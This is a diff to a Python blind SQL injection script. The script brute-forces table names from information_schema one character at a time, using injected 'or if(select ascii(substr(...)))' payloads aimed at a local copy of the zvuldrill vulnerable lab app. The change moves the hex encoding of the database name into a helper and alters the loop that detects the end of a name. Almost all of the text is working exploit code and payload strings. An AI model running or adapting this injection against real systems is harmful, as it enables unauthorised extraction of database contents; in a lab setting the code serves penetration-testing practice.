@@ -4,8 +4,7 @@
 # http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%'+or if((select ascii(substr((select table_name from information_schema.tables where table_schema=0x7A76756C6472696C6C limit 0,1),1,1)) =97),1,0)%23
 import urllib
 from urllib import request
-from data import glovar
-
+from data import glovar, glofun
 
 
 def get_tbname(url='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1', cookie=False, type='search',
@@ -13,16 +12,12 @@ def get_tbname(url='http://192.168.52.128/test2/zvuldrill-master/search.php?sear
 
     response_length = 0
 
-    hex_dbname = ""
-
     tbname = ""
 
     tbname_list = []
 
-    for i in dbname:
-        hex_dbname += hex(ord(i))
+    hex_dbname = glofun.hex_convert(dbname)
 
-    hex_dbname = '0x' + hex_dbname.replace('0x', '')  #将dbname变成16进制
 
     if type == 'int':
         payload = '+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=' + hex_dbname + '+limit+{tbname_order_number},1),{tbname_str_location},1))={ascii_number}),1,0)'
@@ -66,18 +61,22 @@ def get_tbname(url='http://192.168.52.128/test2/zvuldrill-master/search.php?sear
                 elif (response_length - url_read_length) < 50:  # 如果返回包的长度等于或者在比之前包只小了100之内，则是正确的包
 
                     # 如果返回了0，说明返回的是NULL,到了表名字的结果，跳出，寻找下一个表
-                    if j == '0':
-                        tbname_list.append(tbname)
+                    if k != 1:
 
-                        print(tbname)
+                        if j == '0':
+                            tbname_list.append(tbname)
 
-                        tbname = ""
+                            print(tbname)
 
-                        break
+                            tbname = ""
+
+                            break
 
                     tbname += chr(int(j))
 
                     print(tbname)
+
+
 
             # 跳出多重循环
             else:
